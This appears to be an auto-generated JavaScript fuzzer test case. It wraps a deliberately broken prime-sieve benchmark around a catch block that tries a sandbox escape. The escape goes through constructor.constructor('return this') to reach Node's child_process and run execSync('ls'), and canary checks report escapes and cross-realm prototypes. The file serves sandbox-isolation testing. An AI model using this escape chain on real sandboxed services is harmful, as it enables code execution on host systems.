try {
    function pad(number, width) {
        let REPLACER = 23;
        var s = number.toString();
        var prefixWidth = width - s.length;
        if (prefixWidth > 0) {
            for (var i = 1; i <= prefixWidth; i++)
                s = ' ' + s;
        }
        return s;
    }
    function nsieve(m, isPrime) {
        let REPLACER = 23;
        var i, k, count;
        for (i = 2; i <= m; i++) {
            isPrime[i] = true;
        }
        count = 0;
        for (i = 2; i <= m; i++) {
            if (isPrime[i]) {
                for (k = i + i; k <= m; k += i)
                    isPrime[k] = false;
                count++;
            }
        }
        return count;
    }
    function sieve() {
        throw () => {
            return () => {
            };
        };
        var sum = 0;
        for (var i = 1; i <= 3; i++) {
            var m = (1 << i) * 10000;
            var flags = Array(m + 1);
            sum += nsieve(m, flags);
        }
        return sum;
    }
    var result = sieve();
    var expected = 14302;
    if (result != expected)
        throw 'ERROR: bad result: expected ' + expected + ' but got ' + result;
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}